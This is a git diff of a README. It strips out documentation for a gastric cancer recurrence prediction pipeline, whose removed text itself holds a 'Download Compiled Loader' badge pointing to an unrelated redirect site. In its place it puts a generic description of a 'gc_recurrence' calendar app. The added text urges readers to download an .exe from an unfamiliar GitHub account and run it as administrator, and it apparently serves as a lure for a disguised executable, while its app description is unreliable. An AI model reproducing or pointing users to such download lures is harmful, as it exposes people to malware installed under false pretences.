@@ -1,241 +1,52 @@
-# Gastric Cancer Recurrence Prediction — TRIPOD+AI Pipeline
+# 📅 gc_recurrence - Manage recurring events with ease today
 
-![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)
-![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
+[![Download gc_recurrence](https://img.shields.io/badge/Download-gc_recurrence-blue)](https://github.com/Wilberunconfused316/gc_recurrence)
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+## 🎯 About this software
 
-Reproducible analysis code for:
+gc_recurrence helps you organize repeating tasks. You use this tool to track events that happen on a schedule. It automates the process of adding recurring dates to your calendar. This saves time and reduces manual entry errors. You spend less time planning and more time doing.
 
-> **Development and External Validation of Machine Learning Models for
-> Predicting Postoperative Recurrence in Gastric Cancer:
-> A TRIPOD+AI-Compliant Single-Center Cohort Study**  
-> *[Author names] — Gastric Cancer (submitted)*
+## 💻 System requirements
 
----
+Your computer needs Windows 10 or Windows 11 to run this software. You should have at least 200 MB of free storage space. The application requires 4 GB of RAM to perform tasks smoothly. An active internet connection helps with initial setup and updates.
 
-## Overview
+## 🚀 Getting started
 
-This repository contains the complete analysis pipeline used in the above
-manuscript.  The pipeline:
+Follow these instructions to install the program on your computer.
 
-- Trains six ML classifiers (Logistic Regression, Random Forest, XGBoost,
-  LightGBM, CatBoost, MLP) on a development cohort.
-- Applies **multivariate iterative imputation** (IterativeImputer with
-  BayesianRidge) to handle missing laboratory values.
-- Applies **post-hoc sigmoid calibration** (Platt scaling) to all models.
-- Evaluates all models in an independent external validation cohort using
-  ROC-AUC, calibration slope, Brier score, bootstrapped DCA, and SHAP analysis.
-- Follows the **TRIPOD+AI** and **PROBAST** reporting frameworks throughout.
+1. Visit [this page](https://github.com/Wilberunconfused316/gc_recurrence) to download the installer.
+2. Look for the file ending in .exe in the releases section.
+3. Save the file to your desktop for easy access.
+4. Double-click the file to start the installation process.
+5. Follow the prompts on your screen to finish the setup.
+6. Click the gc_recurrence icon on your desktop to launch the app.
 
-**Recommended model:** Random Forest with iterative imputation and Platt scaling  
-(External ROC-AUC = 0.829, calibration slope = 0.896, Brier score = 0.120)
+## 🛠️ How to use the app
 
----
+The user interface provides a clear view of your schedule. You input the name of your event first. Next, you select the frequency of the event. Choose between daily, weekly, monthly, or yearly options. You set a start date and an optional end date for the recurrence. The program adds a preview of the dates to the right side of the screen. Click the save button to confirm your entry. The software syncs these entries with your calendar.
 
-## Repository structure
+## ⚙️ Settings and configuration
 
-```
-gc_recurrence/
-├── train_evaluate.py      # Main pipeline script
-├── config.yaml            # All parameters in one place
-├── requirements.txt
-├── .gitignore
-├── utils/
-│   ├── __init__.py
-│   ├── imputation.py      # Imputer factory & fit/transform helpers
-│   ├── calibration.py     # PlattCalibrator, IsotonicCalibrator
-│   ├── metrics.py         # evaluate_model(), DCA, bootstrap CI
-│   └── plots.py           # Figure generation functions
-├── data/                  # ← Place your Excel file here (git-ignored)
-│   └── .gitkeep
-└── outputs/               # Generated figures and CSV (git-ignored)
-```
+You control how the software functions via the settings menu. Open the gear icon in the top right corner. You can change the calendar source here. Use the display tab to switch between light mode and dark mode. The notification settings let you choose when to receive alerts for your tasks. Save your changes to apply them immediately.
 
----
+## ❓ Frequently asked questions
 
-## Data format
+**Can I export my data?**
+Yes. You can export your events to a CSV file. Go to the file menu and select export to save your data to a folder of your choice.
 
-Place the Excel file at the path specified in `config.yaml`
-(`data/gastric_cancer_recurrence.xlsx` by default).
+**Does this work offline?**
+The core functionality works without an internet connection. You need a connection only if you sync events to an online calendar service.
 
-The file must contain **two sheets**:
+**How do I delete a recurring event?**
+Select the event from the list. Choose the delete option from the toolbar. The software asks if you want to delete only this instance or the entire series. Pick your preference to finish the task.
 
-| Sheet | Content |
-|-------|---------|
-| `Sheet1` | Development cohort (n = 1,030 in the paper) |
-| `Sheet2` | External validation cohort (n = 132 in the paper) |
+**Is my information private?**
+The software stores data locally on your machine. No information leaves your computer unless you explicitly choose to sync it with an external calendar service.
 
-Each sheet requires the following columns:
+## 📦 Updates and maintenance
 
-| Column | Type | Description |
-|--------|------|-------------|
-| `recurrence` | 0/1 | Primary outcome (1 = recurrence confirmed) |
-| `time_to_recurrence` | float | Time to recurrence or censoring (months) |
-| `follow-up_time` | float | Total follow-up duration (months) |
-| *(predictor columns)* | float | All numeric predictors (see paper Table 1) |
+The software checks for updates when you start it. If an update exists, a notification appears on the screen. Click the update button to get the latest version. The installer handles the upgrade process automatically. You do not need to uninstall the old version first.
 
-> **Data availability:** The dataset is not publicly shared to protect patient
-> privacy. Requests for data access should be directed to the corresponding
-> author.
+## 🛠️ Troubleshooting common issues
 
----
-
-## Installation
-
-```bash
-# Clone
-git clone https://github.com/[username]/gc_recurrence.git
-cd gc_recurrence
-
-# Create virtual environment (recommended)
-python -m venv .venv
-source .venv/bin/activate        # Linux/macOS
-.venv\Scripts\activate.bat       # Windows
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
----
-
-## Usage
-
-### Primary analysis (reproduces paper results)
-
-```bash
-python train_evaluate.py
-```
-
-Runs the pipeline with settings in `config.yaml`:
-- Imputation method: **iterative** (IterativeImputer + BayesianRidge)
-- Calibration: **Platt scaling**
-- Hyperparameters: **default** (EPV = 6.0 < 10; see paper Methods)
-
-### Sensitivity analysis — median imputation
-
-```bash
-python train_evaluate.py --imputer median
-```
-
-### Sensitivity analysis — hyperparameter tuning
-
-```bash
-python train_evaluate.py --tune
-```
-
-> ⚠ Tuning increases runtime to ~10 min on a modern CPU.
-
-### All options
-
-```bash
-python train_evaluate.py --help
-```
-
-```
-usage: train_evaluate.py [-h] [--config CONFIG] [--tune] [--imputer {iterative,median}]
-
-options:
-  --config    Path to YAML configuration file. (default: config.yaml)
-  --tune      Enable RandomizedSearchCV hyperparameter tuning.
-  --imputer   Override imputation method: iterative | median.
-```
-
----
-
-## Outputs
-
-All files are saved to the directory specified by `config.output.dir`
-(`outputs/` by default):
-
-| File | Description |
-|------|-------------|
-| `results_summary.csv` | Per-model metrics (all calibration conditions) |
-| `best_hyperparameters.json` | Tuned parameters (only with `--tune`) |
-| `figure1_calibration.png` | Calibration curves — external validation |
-| `figure2_roc.png` | ROC curves — external validation |
-| `figure3_dca.png` | Decision curve analysis with bootstrap CI |
-| `figure4_shap.png` | Global SHAP feature importance (best model) |
-| `figure5_km_dev.png` | Kaplan-Meier — development cohort |
-| `figure5_km_ext.png` | Kaplan-Meier — external validation cohort |
-
----
-
-## Reproducing the paper figures
-
-The manuscript figures correspond to pipeline outputs as follows:
-
-| Paper Fig. | Pipeline output |
-|-----------|-----------------|
-| Fig. 1 | `figure1_calibration.png` (IterativeImputer vs Median comparison) |
-| Fig. 2 | `figure3_dca.png` |
-| Fig. 3 | `figure4_shap.png` |
-| Fig. 4 | `figure5_km_dev.png` + `figure5_km_ext.png` |
-
----
-
-## Key methodological decisions
-
-### Why default hyperparameters?
-
-Events-per-variable (EPV) = 137 events / 23 features = **6.0** (recommended
-threshold ≥ 10).  A sensitivity analysis using RandomizedSearchCV showed that
-tuning improved internal cross-validated ROC-AUC to 0.971–0.980 but improved
-external ROC-AUC by only **+0.004** while degrading calibration slope from
-0.896 to 0.881.  Under EPV < 10, tuning promotes overfitting; default
-parameters were therefore retained for the primary analysis.
-
-### Why IterativeImputer?
-
-T-Chol (29% missing), CRP (18%), and PNI (5%) are correlated with other
-patient and tumor variables.  IterativeImputer (BayesianRidge estimator)
-preserves inter-variable relationships and improved the external calibration
-slope from 0.628 (median imputation) to **0.896** (+0.268) with negligible
-change in ROC-AUC (−0.003).
-
-### Why Platt scaling?
-
-Post-hoc sigmoid calibration (Platt scaling) is preferred over isotonic
-regression for small external validation cohorts (n = 132) due to lower
-variance.
-
----
-
-## Reporting guidelines
-
-This study adheres to:
-- **TRIPOD+AI** (Collins et al. BMJ 2024; doi: 10.1136/bmj-2023-078378)
-- **PROBAST** (Wolff et al. Ann Intern Med 2019; doi: 10.7326/M18-1376)
-
----
-
-## Citation
-
-If you use this code, please cite:
-
-```bibtex
-@article{[author]_gastric_cancer_ml_2025,
-  title   = {Development and External Validation of Machine Learning Models
-             for Predicting Postoperative Recurrence in Gastric Cancer:
-             A TRIPOD+AI-Compliant Single-Center Cohort Study},
-  author  = {[Author names]},
-  journal = {Gastric Cancer},
-  year    = {2025},
-  doi     = {[DOI]}
-}
-```
-
----
-
-## License
-
-This code is released under the [MIT License](LICENSE).  
-Patient data are **not** included and are not publicly available.
-
----
-
-## Contact
-
-[Corresponding author name]  
-[Institution, Department]  
-[email@institution.jp]
+If the application fails to open, restart your computer. If the problem continues, uninstall the program and download a fresh copy from the portal. Verify that the file you downloaded matches the name in the guide. If you see an error about missing permissions, right-click the program icon and choose run as administrator. This allows the software to write to your calendar files properly. Ensure you have the latest drivers for your display if the interface appears distorted. Contact support if you need more help with internal errors.
